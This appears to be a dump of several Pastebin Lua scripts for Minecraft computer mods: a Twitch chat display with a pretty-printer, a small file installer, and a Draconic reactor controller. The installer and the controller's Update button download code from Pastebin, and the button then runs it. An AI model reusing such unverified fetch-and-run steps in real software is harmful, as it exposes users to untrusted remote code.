            return go(doc[1], indent + doc.depth, col)
        elseif kind == ""group"" then
            if not width or get_remaining(doc[1], math.min(width, ribbon_width + indent) - col) >= 0 then
                return go(doc[1], indent, col)
            else
                return go(doc[2], indent, col)
            end
        else
            error(""Unknown doc "" .. kind)
        end
    end

    go(doc, 0, 0)
    return table.concat(out, """", 1, out.n)
end

Doc.__tostring = render --- @local

local keywords = {
    [""and""] = true, [""break""] = true, [""do""] = true, [""else""] = true,
    [""elseif""] = true, [""end""] = true, [""false""] = true, [""for""] = true,
    [""function""] = true, [""if""] = true, [""in""] = true, [""local""] = true,
    [""nil""] = true, [""not""] = true, [""or""] = true, [""repeat""] = true, [""return""] = true,
    [""then""] = true, [""true""] = true, [""until""] = true, [""while""] = true,
  }

local comma = text("","")
local braces = text(""{}"")
local obrace, cbrace = text(""{""), text(""}"")
local obracket, cbracket = text(""[""), text(""] = "")

local function key_compare(a, b)
    local ta, tb = type(a), type(b)

    if ta == ""string"" then return tb ~= ""string"" or a < b
    elseif tb == ""string"" then return false
    end

    if ta == ""number"" then return tb ~= ""number"" or a < b end
    return false
end

local function show_function(fn, options)
    local info = debug_info and debug_info(fn, ""Su"")

    -- Include function source position if available
    local name
    if options.function_source and info and info.short_src and info.linedefined and info.linedefined >= 1 then
        name = ""function<"" .. info.short_src .. "":"" .. info.linedefined .. "">""
    else
        name = tostring(fn)
    end

    -- Include arguments if a Lua function and if available. Lua will report ""C""
    -- functions as variadic.
    if options.function_args and info and info.what == ""Lua"" and info.nparams and debug_local then
        local args = {}
        for i = 1, info.nparams do args[i] = debug_local(fn, i) or ""?"" end
        if info.isvararg then args[#args + 1] = ""..."" end
        name = name .. ""("" .. table.concat(args, "", "") .. "")""
    end

    return name
end

local function pretty_impl(obj, options, tracking)
    local obj_type = type(obj)
    if obj_type == ""string"" then
        local formatted = (""%q""):format(obj):gsub(""\\\n"", ""\\n"")
        return text(formatted, colours.red)
    elseif obj_type == ""number"" then
        return text(tostring(obj), colours.magenta)
    elseif obj_type == ""function"" then
        return text(show_function(obj, options), colours.lightGrey)
    elseif obj_type ~= ""table"" or tracking[obj] then
        return text(tostring(obj), colours.lightGrey)
    elseif getmetatable(obj) ~= nil and getmetatable(obj).__tostring then
        return text(tostring(obj))
    elseif next(obj) == nil then
        return braces
    else
        tracking[obj] = true
        local doc = setmetatable({ tag = ""concat"", n = 1, space_line }, Doc)

        local length, keys, keysn = #obj, {}, 1
        for k in pairs(obj) do keys[keysn], keysn = k, keysn + 1 end
        table.sort(keys, key_compare)

        for i = 1, keysn - 1 do
            if i > 1 then append(doc, comma) append(doc, space_line) end

            local k = keys[i]
            local v = obj[k]
            local ty = type(k)
            if ty == ""number"" and k % 1 == 0 and k >= 1 and k <= length then
                append(doc, pretty_impl(v, options, tracking))
            elseif ty == ""string"" and not keywords[k] and k:match(""^[%a_][%a%d_]*$"") then
                append(doc, text(k .. "" = ""))
                append(doc, pretty_impl(v, options, tracking))
            else
                append(doc, obracket)
                append(doc, pretty_impl(k, options, tracking))
                append(doc, cbracket)
                append(doc, pretty_impl(v, options, tracking))
            end
        end

        tracking[obj] = nil
        return group(concat(obrace, nest(2, concat(table.unpack(doc, 1, doc.n))), space_line, cbrace))
    end
end

--- Pretty-print an arbitrary object, converting it into a document.
--
-- This can then be rendered with @{write} or @{print}.
--
-- @param obj The object to pretty-print.
-- @tparam[opt] { function_args = boolean, function_source = boolean } options
-- Controls how various properties are displayed.
--  - `function_args`: Show the arguments to a function if known (`false` by default).
--  - `function_source`: Show where the function was defined, instead of
--    `function: xxxxxxxx` (`false` by default).
-- @treturn Doc The object formatted as a document.
-- @usage Display a table on the screen
--     local pretty = require ""cc.pretty""
--     pretty.print(pretty.pretty({ 1, 2, 3 }))
local function prettyf(obj, options)
    expect(2, options, ""table"", ""nil"")
    options = options or {}

    local actual_options = {
        function_source = field(options, ""function_source"", ""boolean"", ""nil"") or false,
        function_args = field(options, ""function_args"", ""boolean"", ""nil"") or false,
    }
    return pretty_impl(obj, actual_options, {})
end

local pretty = {
    empty = empty,
    space = space,
    line = line,
    space_line = space_line,
    text = text,
    concat = concat,
    nest = nest,
    group = group,

    write = write,
    print = print,
    render = render,

    pretty = prettyf,
}

local monitor = peripheral.find(""monitor"")
local oldTerm = term.redirect(monitor)

function split(str, character)
  result = {}
  index = 1
  for s in string.gmatch(str, ""[^""..character..""]+"") do
    result[index] = s
    index = index + 1
  end
  return result
end
local hex = {""F0F0F0"", ""F2B233"", ""E57FD8"", ""99B2F2"", ""DEDE6C"", ""7FCC19"", ""F2B2CC"", ""4C4C4C"", ""999999"", ""4C99B2"", ""B266E5"", ""3366CC"", ""7F664C"", ""57A64E"", ""CC4C4C"", ""191919""}
local rgb = {}
for i=1,16,1 do
  rgb[i] = {tonumber(hex[i]:sub(1, 2), 16), tonumber(hex[i]:sub(3, 4), 16), tonumber(hex[i]:sub(5, 6), 16)}
end
local rgb2 = {}
for i=1,16,1 do
  rgb2[i] = {}
  for j=1,16,1 do
    rgb2[i][j] = {(rgb[i][1] * 34 + rgb[j][1] * 20) / 54, (rgb[i][2] * 34 + rgb[j][2] * 20) / 54, (rgb[i][3] * 34 + rgb[j][3] * 20) / 54}
  end
end
 
colors.fromRGB = function (r, g, b)
  local dist = 1e100
  local d = 1e100
  local color = -1
  for i=1,16,1 do
    d = math.sqrt((math.max(rgb[i][1], r) - math.min(rgb[i][1], r)) ^ 2 + (math.max(rgb[i][2], g) - math.min(rgb[i][2], g)) ^ 2 + (math.max(rgb[i][3], b) - math.min(rgb[i][3], b)) ^ 2)
    if d < dist then
      dist = d
      color = i - 1
    end
  end
  return 2 ^ color
end
 
local ws

function main()
	ws, err = http.websocket(""wss://irc-ws.chat.twitch.tv"")
	if err then
		print(err)
	elseif ws then
		ws.send(""PASS ottomated"")
		ws.send(""NICK justinfan""..math.random(10000, 99999))
		ws.send(""JOIN #""..CHATROOM)
		ws.send(""CAP REQ :twitch.tv/tags"")
		ws.send(""CAP REQ :twitch.tv/commands"")
		while true do
			local msg = ws.receive()
			if msg == ""PING :tmi.twitch.tv"" then
				ws.send(""PONG :tmi.twitch.tv"")
			else
				-- print(msg)
				local parts = split(msg, "" "")
				if parts[3] == ""PRIVMSG"" then
					local twitchParts = split(parts[1], "";"")
					local nameColor = ""#ffffff""
					local displayName
					local subscriber = false
					local founder = false
					local id
					for _, part in ipairs(twitchParts) do
						if string.sub(part, 1, 12) == ""@badge-info="" then
							founder = string.find(part, ""founder"") ~= nil
						elseif string.sub(part, 1, 6) == ""color="" then
							nameColor = string.sub(part, 7, -1)
						elseif string.sub(part, 1, 13) == ""display-name="" then
							displayName = string.sub(part, 14, -1)
						elseif string.sub(part, 1, 3) == ""id="" then
							id = string.sub(part, 4, -1)
						elseif string.sub(part, 1, 11) == ""subscriber="" then
							subscriber = string.sub(part, 12, -1) == ""1""
						end
					end
					subscriber = subscriber or founder
					
					local namePalette
					if #nameColor < 1 then
						namePalette = 2^math.random(0, 15)
					else
						local hex = string.sub(nameColor, 2, -1)
						local r = tonumber(string.sub(hex, 1, 2), 16)
						local g = tonumber(string.sub(hex, 3, 4), 16)
						local b = tonumber(string.sub(hex, 5, 6), 16)
						namePalette = colors.fromRGB(r, g, b)
					end

					if namePalette == colors.black or namePalette == colors.white then
						namePalette = colors.lightGray
					end

					if displayName and id then
						local message = string.sub(parts[5], 2, -1)

						for i=6,#parts do
							message = message.."" ""..parts[i]
						end
						if string.sub(message, 1, 7) == ""ACTION"" then
							message = string.sub(message, 9, -4)
						else
							message = string.sub(message, 1, -2)
						end
						if subscriber or not SUBSONLY then
							pretty.print(pretty.group(pretty.text(displayName, namePalette) .. pretty.text("":"", colors.white) .. pretty.space .. pretty.text(message, colors.white)))
							-- term.setTextColor(namePalette)
							-- term.write(displayName)
							-- term.setCursorPos()
							-- print(displayName, message)
						end
					end
				elseif CLEAR_MESSAGES and (parts[3] == ""CLEARMSG"" or parts[3] == ""CLEARCHAT"") then
					term.clear()
					term.setCursorPos(1,1)
				end
			end
		end
	end
end
while true do
 pcall(main)
 if ws then
	 ws.close()
 end
end
--term.redirect(oldTerm)"
2xGBaRTX,Untitled,Overcontrol1,Lua,Friday 4th of April 2025 10:52:11 AM CDT,"local files_to_grab_JSON = '{""Xm6DQ6wr"":""0.composite""}';
local files_to_grab = textutils.unserialiseJSON(files_to_grab_JSON);

local install_directory = """"

local new_file_identifier = ""--ccpm_filename ""

local files_waiting = {};

local function fetchFile(pastebinID, filename)
    if fs.exists(filename) then
        fs.delete(filename);
    end

    return shell.run(""pastebin"", ""get "" .. pastebinID .. "" "" .. filename);
end

for pastebinID, filename in pairs(files_to_grab) do
    local success = fetchFile(pastebinID, filename);

    if success then
        table.insert(files_waiting, filename);
    end
end

local unconsumed_files = {};

local function consumeCompositeFile(fileHandle)
    local currentLine = fileHandle.readLine();
    local currentHandle = nil;

    while currentLine ~= nil do
        if string.find(currentLine, new_file_identifier) then
            -- new file, consume old one
            if currentHandle ~= nil then
                currentHandle.close();
            end

            local filename = string.sub(currentLine, #new_file_identifier + 1);
            currentHandle = fs.open(install_directory..""/""..filename, ""w"");
        elseif currentHandle ~= nil then
            currentHandle.writeLine(currentLine)
        end
        currentLine = fileHandle.readLine();
    end

    if currentHandle ~= nil then
        currentHandle.close();
    end
end

local function consumeFiles()
    while #files_waiting > 0 do
        for index, filename in ipairs(files_waiting) do
            if fs.exists(filename) then
                table.remove(files_waiting, index);
                table.insert(unconsumed_files, filename);
            end
        end

        for index, temp_filename in ipairs(unconsumed_files) do
            local temp_file = fs.open(temp_filename, ""r"");
            consumeCompositeFile(temp_file)
            temp_file.close();
            fs.delete(temp_filename);
        end
    end
end

consumeFiles();"
Xm6DQ6wr,Untitled,Overcontrol1,Lua,Friday 4th of April 2025 10:52:10 AM CDT,"--ccpm_filename index.lua
local module = require(""folder.module"")

print(module.skib);
--ccpm_filename folder/module.lua
local module = {}

module.skib = ""Skibidi""

return module;"
WKFpF6rS,Draconic Control v15.0b [xMPD] [Lua 5.3 / 5.2],neuroticfox,Lua,Friday 4th of April 2025 10:49:51 AM CDT,"-- Dear Programmer:
-- When we wrote this code, only god and
-- us understood how it worked. And now
-- only god knows.
--
-- Therefore, if you are trying to optimize
-- this script and it fails (Very likely),
-- please increase this counter for the next
-- person. 
--
-- wastedHours = 611

 :: start ::
 -- Locals & Requirements
	local component = require(""component"")
	local event = require(""event"")
	local term = require(""term"")
	local gpu = component.gpu
	local screen = component.screen
	local unicode= require(""unicode"")
	local reactorOutputMultiplier = 1
	local cutoffTemp = 9005
	local chaosMode = 0
	local tempDrop = 0
	local devMode = 0
	local fieldAdj = 0
	local deviation = 0
	local cVar = ""DEV RELEASE: Use at your own risk.""
	local tArgs = {...}
	local Arg0 = tonumber(tArgs[1])
	local Arg1 = tonumber(tArgs[2])
	local Arg2 = tonumber(tArgs[3])
	local Arg3 = tonumber(tArgs[4])
	local Arg4 = tostring(tArgs[5])
	local Arg5 = tostring(tArgs[6])
	local ratioX, ratioY = screen.getAspectRatio()
	local maxX, maxY = gpu.maxResolution()
	-- Inflow PID
	local proportional_field_error = 0
	local inflow_I_sum = 0
	local integral_field_error = 0
	local derivative_field_error = 0
	local inflow_D_last = 0
	local inflow_correction = 0
    -- Outflow PID
	local proportional_temp_error = 0
	local outflow_I_sum = 0
	local integral_temp_error = 0
	local derivative_temp_error = 0
	local outflow_D_last = 0
	local outflow_correction = 0
	local cutoff_temp = 69420
	gpu.setResolution(math.min(ratioX*55, maxX), math.min(ratioY*25,maxY))
term.clear()
term.setCursor(0, 0)
 -- pArgs
if not Arg0 then 
os.execute(cls)
print(""Draconic Control 15"")
print(""1.12 - 1.16 Compatible-ish"")
print()
print(""dc15 [Mult] [Temp] [Field] [Mode]"")
print()
print(""Arguments"")
print()
print(""[Mult]			-	Reactor Output Multiplier"")
print(""1.16 [10]			1.12 [1]"")
print()
print(""[Temp]			-	Desired Reactor Temperature"")
print(""Default [8000]			Range [2500-8000]"")
print()
print(""[Field]			-	Desired Field Strength"")
print(""Default [15]			Range [0.5-99]"")
print()
print(""[Mode]			-	Set Desired Program Mode"")
print(""Default [1]			Range [1-3]"")
print(""[1-3]			-	Simple, Dev, noGUI"")
print()
print(""[sFlux]			-	Swap Flux Gates [If Required]"")
print(""Default [0]			Range [0-1]"")
print(""[1-3]			-	Simple, Dev, noGUI"")
print()
print(""Compiled by BrokenSynapse, AwesomeAlec1, and DoctorEnigma"")
print()
print(""Thanks to Maurdekye for creating the base of this program:"")
print(""             https://youtu.be/iLvkk41K84E"")
print()
print("" Thanks to AwesomeAlec1 for creating the control script:"")
print(""             https://youtu.be/CLku1ckXpeU"")
print()
print(""   And a very special thanks to ZanBorg for breaking"")
print(""      this script until it doesn't break anymore."")
goto fin
end
 -- sArgs
local reactorOutputMultiplier = Arg0
local idealTemp = Arg1 or 8000
local idealField = Arg2 or 15
local Mode = Arg3 or 1
local sFlux = Arg4 or 0
 -- Components
	if not component.isAvailable(""draconic_reactor"") then
		print(""Reactor not connected. Please connect computer to reactor with an Adapter block."")
		os.exit()
	end
	local reactor = component.draconic_reactor
	local info = reactor.getReactorInfo()
	local fluxGates = {}
	for x,y in pairs(component.list(""flux_gate"")) do
		fluxGates[#fluxGates+1] = x
	end
	if #fluxGates < 2 then
		print(""Not enough flux gates connected; please connect inflow and outflow flux gates with Adapter blocks."")
		os.exit()
	end
	local inputFlux = component.proxy(fluxGates[1])
	local outputFlux = component.proxy(fluxGates[2])
	outputFlux.setOverrideEnabled(true)
	inputFlux.setOverrideEnabled(true)
	if not inputFlux or not outputFlux then
		print(""Not enough flux gates connected; please connect inflow and outflow flux gates with Adapter blocks."")
		os.exit()
	end
	
 -- AutoSet Gates
		reactor.chargeReactor()
		satOne = info.energySaturation
		fieldOne = info.fieldStrength
		inputFlux.setFlowOverride(10.0)
		os.sleep(1)
		satTwo = info.energySaturation
		fieldTwo = info.fieldStrength
		inputFlux.setFlowOverride(0.0)
		reactor.stopReactor()
	if satTwo <= satOne or fieldTwo <= fieldOne then
	local oldAddr = inputFlux.address
      inputFlux = component.proxy(outputFlux.address)
      outputFlux = component.proxy(oldAddr)
	end
	if sFlux == 1 then
	local oldAddr = inputFlux.address
      inputFlux = component.proxy(outputFlux.address)
      outputFlux = component.proxy(oldAddr)
	end

 -- Functions
 
function exit_msg(msg)
	term.clear()
	print(msg)
	os.exit()
end
function modifyTemp(offset)
	local newTemp = idealTemp + offset
	if newTemp > 8000 and Mode == 1 then
		newTemp = 8000
	elseif newTemp > 8000 and Mode == 2 and chaosmode == 0 then
		newTemp = 8000
	elseif newTemp > 18000 and chaosmode == 1 then
		newTemp = 18000
	elseif newTemp < 2000 then
		newTemp = 2000
	end
		idealTemp = newTemp
	end
function modifyField(offset)
	local newField = idealField + offset
	if newField > 99 then
		newField = 99
	elseif newField < 100 and chaosMode == 1 then
		newField = 100
	elseif newField < 0.5 and Mode == 1 or Mode == 3 then
		newField = 0.5
	elseif newField < 0.125 and Mode == 2 then
		newField = 0.125
	end
		idealField = newField
	end
	
 -- Buttons
	local adj_button_width = 19
	local tempOffsetX = 62
	local tempOffsetY = 2
	local fieldOffsetX = tempOffsetX + adj_button_width + 2
	local fieldOffsetY = 2
	local cutoffField = 0.75
	highest_use = 0.1
	local buttons = {
	startButton={
    x=2,
    y=20,
    width=18,
    height=1,
    text=""Start"",
	textcolor = 0x0000AA,
    action=function()
      if info.status == ""cooling"" or info.status == ""cold"" then
			chaosMode = 0
			idealField = Arg2
			cutoffField = 0.3
			idealTemp = Arg1
			startingVar = 1
			cVar = ""Do not use Chaos Mode with less than one block of fuel""
        reactor.chargeReactor()
      elseif info.status == ""stopping"" then
			chaosMode = 0
			idealField = Arg2
			cutoffField = 0.3
			idealTemp = Arg1
			startingVar = 0
			cVar = ""Do not use Chaos Mode with less than one block of fuel""
        reactor.activateReactor()
      end
    end,
	condition=function() return info.status ~= ""running"" and info.status ~= ""warming_up"" end
  },
  shutdownButton={
    x=2,
    y=20,
    width=18,
    height=1,
    text=""Shutdown"",
	textcolor = 0xAA0000,
    action=function()
    cutoffTemp = 9000
    idealTemp = Arg1
    cutoffField = 0.4
	cVar = ""Do not use Chaos Mode with less than one block of fuel""
      state = ""MASD""
      reactor.stopReactor()
    end,
	condition=function() return info.status == ""running"" or info.status == ""warming_up"" end
  },
  chaosMode={
    x=2,
    y=22,
    width=18,
    height=1,
    text="" Chaos Mode"",
	textcolor = 0x800080,
    action=function()
		if chaosMode == 0 then
			chaosMode = 1
			cutoffTemp = 18000
			idealTemp = 18000
			idealField = 100
			cutoffField = 5
			idealTemp = 8000
		elseif chaosMode == 1 then
			chaosMode = 0
			idealField = Arg2
			cutoffField = 0.4
			idealTemp = Arg1
		end
    end,
    condition=function() return Mode == 2 and info.status == ""running"" end
  },
  forceExit={
    x=158,
    y=1,
    width=3,
    height=1,
    text="" X "",
	textcolor = 0xB00000,
    action=function()
		inputFlux.setFlowOverride(250000.0)
		chaosMode = 0
		idealField = 99
		cutoffField = 0.4
		idealTemp = Arg1
      reactor.stopReactor()
      gpu.setResolution(gpu.maxResolution())
	  event_loop = false
	  os.execute(""cls"")
    end,
--    condition=function() return running or shutting_down end
  },
  Update={
    x=22,
    y=22,
    width=18,
    height=1,
    text=""Update"",
    action=function()
		reactor.stopReactor()
		os.execute(""cd /home; pastebin get -f WKFpF6rS dc15; cls; dc15"")
    end,
	condition=function() return info.status ~= ""running"" and info.status ~= ""warming_up"" end
  },
  switchGates={
    x=2,
    y=22,
    width=18,
    height=1,
    text=""Swap Flux Gates"",
    action=function()
      cutoffTemp = 10500
      local old_addr = inputFlux.address
      inputFlux = component.proxy(outputFlux.address)
      outputFlux = component.proxy(old_addr)
    end,
	condition=function() return info.status == ""cooling"" or info.status == ""cold"" or info.status == ""stopping"" end
  },
  tempMax={
    x=tempOffsetX,
    y=tempOffsetY,
    width=adj_button_width,
    height=1,
    text=""Maximum"",
	textcolor = 0x552222,
    action=function()
    idealTemp = 8000 end
  },
  tempPThousand={
    x=tempOffsetX,
    y=tempOffsetY+2,
    width=adj_button_width,
    height=1,
    text=""+1000"",
	textcolor = 0x552222,
    action=function() modifyTemp(1000) end
  },
  tempPHundred={
    x=tempOffsetX,
    y=tempOffsetY+4,
    width=adj_button_width,
    height=1,
    text=""+100"",
	textcolor = 0x552222,
    action=function() modifyTemp(100) end
  },
  tempPTen={
    x=tempOffsetX,
    y=tempOffsetY+6,
    width=adj_button_width,
    height=1,
    text=""+10"",
	textcolor = 0x552222,
    action=function() modifyTemp(10) end
  },
  tempPOne={
    x=tempOffsetX,
    y=tempOffsetY+8,
    width=adj_button_width,
    height=1,
    text=""+1"",
	textcolor = 0x552222,
    action=function() modifyTemp(1) end
  },
  tempMin={
    x=tempOffsetX,
    y=tempOffsetY+20,
    width=adj_button_width,
    height=1,
    text=""Minimum"",
	textcolor = 0x552222,
    action=function() modifyTemp(-20000) end
  },
  tempMThousand={
    x=tempOffsetX,
    y=tempOffsetY+18,
    width=adj_button_width,
    height=1,
    text=""-1000"",
	textcolor = 0x552222,
    action=function() modifyTemp(-1000) end
  },
  tempMHundred={
    x=tempOffsetX,
    y=tempOffsetY+16,
    width=adj_button_width,
    height=1,
    text=""-100"",
	textcolor = 0x552222,
    action=function() modifyTemp(-100) end
  },
  tempMTen={
    x=tempOffsetX,
    y=tempOffsetY+14,
    width=adj_button_width,
    height=1,
    text=""-10"",
	textcolor = 0x552222,
    action=function() modifyTemp(-10) end
  },
  tempMOne={
    x=tempOffsetX,
    y=tempOffsetY+12,
    width=adj_button_width,
    height=1,
    text=""-1"",
	textcolor = 0x552222,
    action=function() modifyTemp(-1) end
  },
  fieldPTen={
    x=fieldOffsetX,
    y=fieldOffsetY+1,
    width=adj_button_width,
    height=1,
    text=""+10"",
	textcolor = 0x222299,
    action=function() modifyField(10) end
  },
    fieldPOne={
    x=fieldOffsetX,
    y=fieldOffsetY+3,
    width=adj_button_width,
    height=1,
    text=""+1"",
	textcolor = 0x222299,
    action=function() modifyField(1) end
  },
  fieldPTenth={
    x=fieldOffsetX,
    y=fieldOffsetY+5,
    width=adj_button_width,
    height=1,
    text=""+0.1"",
	textcolor = 0x222299,
    action=function() modifyField(0.1) end
  },
    fieldPThou={
    x=fieldOffsetX,
    y=fieldOffsetY+7,
    width=adj_button_width,
    height=1,
    text=""+0.005"",
	textcolor = 0x222299,
    action=function() modifyField(0.005) end
  },
  fieldMTen={
    x=fieldOffsetX,
    y=fieldOffsetY+19,
    width=adj_button_width,
    height=1,
    text=""-10"",
	textcolor = 0x222299,
    action=function() modifyField(-10) end
  },
    fieldMOne={
    x=fieldOffsetX,
    y=fieldOffsetY+17,
    width=adj_button_width,
    height=1,
    text=""-1"",
	textcolor = 0x222299,
    action=function() modifyField(-1) end
  },
  fieldMTenth={
    x=fieldOffsetX,
    y=fieldOffsetY+15,
    width=adj_button_width,
    height=1,
    text=""-0.1"",
	textcolor = 0x222299,
    action=function() modifyField(-0.1) end
   },
     fieldMThou={
    x=fieldOffsetX,
    y=fieldOffsetY+13,
    width=adj_button_width,
    height=1,
    text=""-0.005"",
	textcolor = 0x222299,
    action=function() modifyField(-0.005) end
   }
}

local condition = reactor.getReactorInfo()
if not condition then
  print(""Reactor not initialized, please ensure the stabilizers are properly laid out."")
  os.exit()
end

 -- tweakable pid gains

inflow_P_gain = 1.1
inflow_I_gain = 0.04
inflow_D_gain = 0.1
 
outflow_P_gain = 400
outflow_I_gain = 0.5
outflow_II_gain = 0.0000003
outflow_D_gain = 60000


inflow_I_sum = 0
inflow_D_last = 0

outflow_I_sum = 0
outflow_II_sum = 0
outflow_D_last = 0

state = ""Standby""
shutting_down = false

if condition.temperature > 25 then
  state = ""Cooling""
end
if condition.temperature > 2000 then
  state = ""Active""
end

 -- Possible states:
  --Standby
  --Charging
  --Active
  --Manual Shutdown
  --Emergency Shutdown
  --Cooling

 -- Control Loop
event_loop = true
while event_loop do
:: loopstart ::
		info = reactor.getReactorInfo()
	if not info or info.maxFuelConversion < 0.001 then 
	cutoffTemp = 9000
	idealTemp = Arg1
	chaosMode = 0
	gpu.setBackground(0x000000)
	gpu.setForeground(0xFF0000)
	term.setCursor(55, 1)
	print ""Please verify that your reactor is refueled.""
	term.setCursor(55, 2)
	print ""Please verify the integrity of your reactor.""
	goto start
	gpu.setForeground(0x000000)
	end
	if info.temperature >= 2000 and info.status ~= ""stopping""  then
		reactor.activateReactor()
	end

  local inflow = 0.0
  local outflow = 0.0

  shutting_down = state == ""Manual Shutdown"" or state == ""Emergency Shutdown""
  running = state == ""Charging"" or state == ""Active""
  safe = state == ""Standby"" or state == ""Cooling""

  if state == ""Charging"" then
    inflow = 200000.0

    if info.temperature > 2000 then
      reactor.activateReactor()
      state = ""Active""
    end
  elseif state == ""Cooling"" then
    if info.temperature < 25 then
      state = ""Standby""
    end
    inflow = 10.0
    outflow = 20.0
  elseif state == ""Standby"" then
    inflow = 10.0
    outflow = 20.0
  else
  
    -- adjust inflow rate based on field strength
   
    local field_error = (info.maxFieldStrength * (idealField / 100)) - info.fieldStrength
    local proportional_field_error = field_error * inflow_P_gain
    inflow_I_sum = inflow_I_sum + field_error
    local integral_field_error = inflow_I_sum * inflow_I_gain
    local derivative_field_error = (field_error - inflow_D_last) * inflow_D_gain
    inflow_D_last = field_error
    local inflow_correction = proportional_field_error + integral_field_error + derivative_field_error
    if inflow_correction < 0 then
      inflow_I_sum = inflow_I_sum - field_error
    end
    inflow = inflow_correction

    if not shutting_down then

      -- adjust outflow rate based on core temperature

      local temp_error = idealTemp - info.temperature
      local proportional_temp_error = temp_error * outflow_P_gain
      outflow_I_sum = outflow_I_sum + temp_error
      local integral_temp_error = outflow_I_sum * outflow_I_gain
      if math.abs(temp_error) < 100 then
        outflow_II_sum = outflow_II_sum + integral_temp_error
      else
        outflow_II_sum = 0
      end
      local second_integral_temp_error = outflow_II_sum * outflow_II_gain
      local derivative_temp_error = (temp_error - outflow_D_last) * outflow_D_gain
      outflow_D_last = temp_error
      local outflow_correction = proportional_temp_error + integral_temp_error + second_integral_temp_error + derivative_temp_error
      if outflow_correction < 0 then
        outflow_I_sum = outflow_I_sum - temp_error
      end
      outflow = outflow_correction

      -- cut off reactor in case of emergency

      if info.temperature > cutoff_temp then
        print(""Reactor Too Hot, shutting down"")
        outflow = 0.0
        new_strength = 50
        cutoff_temp = 10001
        state = ""Emergency Shutdown""
        reactor.stopReactor()
      end
      if ((info.fieldStrength / info.maxFieldStrength) * 100) < 0.75 and chaosMode == 0 then
        print(""Reactor Field Has Failed, Failsafe Activated, Shutting Down"")
        outflow = 0.0
        new_strength = 50
        cutoff_temp = 10001
        state = ""Emergency Shutdown""
        reactor.stopReactor()
      end
	  if ((info.fieldStrength / info.maxFieldStrength) * 100) < 5 and chaosMode == 1 then
        print(""Reactor Field Has Failed, Failsafe Activated, Shutting Down"")
        outflow = 0.0
        new_strength = 50
        cutoff_temp = 10001
        state = ""Emergency Shutdown""
        reactor.stopReactor()
      end
      if ((1 - info.fuelConversion / info.maxFuelConversion) * 100) < 12 then
        print(""Reactor Fuel Low, Shutting Down"")
        outflow = 0.0
        new_strength = 1
        cutoff_temp = 10001
        state = ""Emergency Shutdown""
        reactor.stopReactor()
      end
    else
      if info.temperature < 2000 then
        state = ""Cooling""
      end
    end
  end

  if state ~= ""Active"" and not shutting_down then
    inflow_I_sum = 0
    inflow_D_last = 0
    outflow_I_sum = 0
    outflow_II_sum = 0
    outflow_D_last = 0
  end

  if inflow < 0 then
    inflow = 0.0
  end
  if outflow < 0 then
    outflow = 0.0
  end
if ((info.fieldStrength / info.maxFieldStrength) * 100) > 2.5 then
  inputFlux.setFlowOverride(inflow)
end 
if info.temperature > 7500 then
  outputFlux.setFlowOverride(outflow)
end
 
 -- Auto Adjust Offset
 
	if info.temperature == idealTemp and ((info.fieldStrength / info.maxFieldStrength) * 100) < idealField and chaosMode ~= 1 then
		fieldAdj = (idealField - ((info.fieldStrength / info.maxFieldStrength) * 100))
    end

	local targetShieldPercent = idealField or 15 -- Desired shield strength
	local targetShield = (targetShieldPercent / 100)
	
 -- Reactor equation variables

	local targetTemp50  = math.min((idealTemp / 10000) * 50, 99)
    local coreSat       = info.energySaturation / info.maxEnergySaturation
    local convLVL       = (info.fuelConversion / info.maxFuelConversion * 1.3) - 0.3
	
 -- Calculate the temperature rise resistance for the reactor at the desired temperature.
 
    local targetTempResist = ((targetTemp50^4) / (100 - targetTemp50))
	
 -- Calculate the temperature rise exponential needed to reach the desired temperature
 
    local targetTempExpo = -(targetTempResist*convLVL) - 1000*convLVL + targetTempResist
	
 -- Calculate the saturation level needed to produce the required tempRiseExpo
 
    local term1 = 1334.1-(3*targetTempExpo)
    local term2 = (1200690-(2700*targetTempExpo))^2
    local term3 = ((-1350*targetTempExpo)+(((-4*term1^3+term2)^(1/2))/2)+600345)^(1/3)
    local targetNegCSat = -(term1/(3*term3))-(term3/3)
	
 -- Saturation received from above equation needs to be reformatted to a more useful form
 
    local targetCoreSat = 1 - (targetNegCSat/99)
    local targetSat = targetCoreSat * info.maxEnergySaturation
	
 -- Calculate the difference between where saturation is and where it needs to be
 
    local saturationError = info.energySaturation - targetSat
	
 -- Calculate field drain
 
    local tempDrainFactor = 0
    if info.temperature > 8000 then
		tempDrainFactor = 1 + ((info.temperature-8000)^2 * 0.0000025)
    elseif info.temperature > 2000 then
		tempDrainFactor = 1
    elseif info.temperature > 1000 then
		tempDrainFactor = (info.temperature-1000)/1000
    end
    local baseMaxRFt = (info.maxEnergySaturation / 1000) * reactorOutputMultiplier * 1.5
    local fieldDrain = math.min(tempDrainFactor * math.max(0.01, (1-coreSat)) * (baseMaxRFt / 10.923556), 2147000000)
    local fieldNegPercent = 1 - targetShield
	
 --local fieldInputRate = fieldDrain / fieldNegPercent
 
    local fieldStrengthError = (info.maxFieldStrength * targetShield) - info.fieldStrength
    local requiredInput = math.min((info.maxFieldStrength * info.fieldDrainRate) / (info.maxFieldStrength - info.fieldStrength), info.maxFieldStrength - info.fieldStrength)
	
 --Automations
 
	if info.status == ""running"" then
    local outputNeeded = math.min(saturationError, (info.maxEnergySaturation/40))-- + info.generationRate
		
		if ((info.fieldStrength / info.maxFieldStrength) * 100) < 2.5 then
		outputFlux.setFlowOverride(outputNeeded)
		end
		if info.temperature < 7500 then
		inputFlux.setFlowOverride(math.min(fieldStrengthError + requiredInput, info.maxFieldStrength) - info.fieldDrainRate + 1)
		else
		outputFlux.setFlowOverride(outflow)
		end
    elseif info.status == ""warming_up"" then
		outputFlux.setFlowOverride(0.0)
		inputFlux.setFlowOverride(550000000.0)
    elseif info.status == ""stopping"" then
		outputFlux.setFlowOverride(0.0)
		inputFlux.setFlowOverride(requiredInput)
    if info.temperature > cutoffTemp then
        print(""Reactor Too Hot, shutting down"")
        reactor.stopReactor()
    end
    if ((info.fieldStrength / info.maxFieldStrength) * 100) < cutoffField then
        print(""Reactor Field Has Failed, Failsafe Activated, Shutting Down"")
        reactor.stopReactor()
    end
    if ((1 - info.fuelConversion / info.maxFuelConversion) * 100) < 0.2 then
        print(""Reactor Fuel Low, Shutting Down"")
		reactor.stopReactor()
    end
   end

	-- Get Temp Rise
		oldTemp = currentTemp or info.temperature
		currentTemp = info.temperature
		oldTempRate = tempChangeRate or currentTemp - oldTemp
		tempChangeRate = currentTemp - oldTemp
		tempAccel = tempChangeRate - oldTempRate
	if tempAccel == 0 then
		tempAccel = 0.001
	end
	-- Get Fuel Use Rate
		oldFuel = currentFuel or (info.maxFuelConversion - info.fuelConversion)
		currentFuel = (info.maxFuelConversion - info.fuelConversion)
